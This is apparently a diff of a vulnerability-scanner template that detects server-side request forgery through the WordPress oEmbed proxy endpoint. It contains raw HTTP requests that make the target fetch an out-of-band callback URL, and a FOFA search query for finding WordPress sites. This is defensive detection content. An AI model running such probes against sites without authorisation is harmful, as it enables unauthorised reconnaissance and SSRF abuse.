@@ -1,20 +1,43 @@
 http:
 - matchers:
+  - part: body_1
+    type: word
+    words:
+    - rest_missing_callback_param
   - part: interactsh_protocol
     type: word
     words:
     - http
-  method: GET
-  path:
-  - '{{BaseURL}}/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}/'
+  matchers-condition: and
+  raw:
+  - 'GET /wp-json/oembed/1.0/proxy HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  - 'GET /wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
 id: wordpress-ssrf-oembed
 info:
   author: dhiyaneshDk
+  classification:
+    cpe: cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*
+    cwe-id:
+    - CWE-918
+  description: The oEmbed feature in WordPress allows embedding content from external
+    sources, and if it's not properly secured, it could be exploited for SSRF.
   metadata:
-    max-request: 1
-  name: Wordpress Oembed Proxy SSRF
+    fofa-query: body="oembed" && body="wp-"
+    max-request: 2
+    product: wordpress
+    runzero-review: REJECT/2025-11-07/uses interactsh
+    vendor: wordpress
+  name: Wordpress Oembed Proxy - Server-side request forgery
   reference:
-  - https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
+  - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
   - https://github.com/incogbyte/quickpress/blob/master/core/req.go
   severity: medium
-  tags: wordpress,ssrf,oast,proxy
+  tags: oast,oembed,ssrf,vuln,wordpress
